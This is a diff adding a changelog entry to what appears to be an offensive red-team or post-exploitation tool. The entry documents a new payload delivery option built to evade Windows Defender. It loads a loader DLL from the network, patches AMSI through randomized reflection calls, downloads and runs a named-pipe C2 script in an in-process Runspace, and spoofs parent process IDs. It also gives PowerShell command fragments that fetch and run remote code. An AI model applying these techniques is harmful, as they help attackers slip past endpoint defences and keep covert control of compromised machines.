@@ -5,6 +5,43 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-07e] feat(evasion): Bootstrap option [3] — DLL AMSI patch + in-process Runspace for CMD delivery
+
+**Problem:** Option [2] Serve (`powershell -nop -ep bypass -w hidden -c "&([scriptblock]::Create(...))"`)
+is killed by Windows Defender RT behavioral detection on domain-joined targets. Defender flags the
+combination: hidden PS process + HTTP download + scriptblock execute + named pipe C2 loop.
+Confirmed on test target: code is correct (works on unmonitored machine), issue is Defender RT.
+
+**Fix — Option [3] Bootstrap:**
+A new delivery option that avoids all static AMSI signatures in the command line and changes the
+execution path away from the signatured `scriptblock::Create` + `iex` + `downloadstring` patterns:
+
+1. `[Reflection.Assembly]::Load(DownloadData('<dll>'))` — loads AmnesiacLoader DLL as raw bytes;
+   AMSI never scans binary bytes, only script strings. No static signature.
+2. `.GetType('<random>.<random>').GetMethod('<random>').Invoke($null,$null)` — patches AMSI via
+   reflection using fully randomized class/method names (Build.ps1 re-randomizes every engagement).
+   No static AmsiUtils/amsiInitFailed string in the command line.
+3. `iwr '<url>' -UseBasicParsing` — downloads the lite pipe script; AMSI is now blind so the pipe
+   script is never scanned even though it runs in the same process.
+4. `.GetType('<random>.<random>').GetMethod('<random>').Invoke($null, [int]0, pipeScript)` — runs
+   pipe script via a managed CLR Runspace (`InjectUnmanagedPS`), not via `[scriptblock]::Create`
+   or `iex`. Different behavioral execution path.
+
+No `-w hidden`, no `-nop` — only `-ep bypass`. The PS process is visible (no hidden window flag),
+reducing Defender's "hidden PS + download + C2" behavioral rule trigger.
+
+**C# fixes (AmnesiacLoader):**
+- `SpawnUnmanagedPS` was broken: passed UTF-8 string bytes as shellcode to APC injection, causing
+  immediate crash in target process. Fixed to use new `Injector.SpawnWithPPID()`.
+- Added `Injector.SpawnWithPPID(cmdLine, spoofParentPid)` — creates a process with PPID spoofed
+  to `spoofParentPid` via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` + `CreateProcessW`, without
+  suspension or APC injection. Used by `SpawnUnmanagedPS` for the Migrate PS path.
+- DLL rebuilt with new randomized namespace (`SbP3ARMRrN`) and name map.
+
+**UI change:** Stealth payload blocks now show [3] Bootstrap only when AmnesiacLoader blob is
+embedded (Build.ps1 has been run). Option prompt dynamically becomes `[1]/[2]/[3]` vs `[1]/[2]`.
+Selecting [3] also writes the DLL to the serve root so it's immediately available via serve.
+
 ## [2026-06-07d] fix(ux): serve check, port change, and LoadWithPartialName removal
 
 **Changes:**
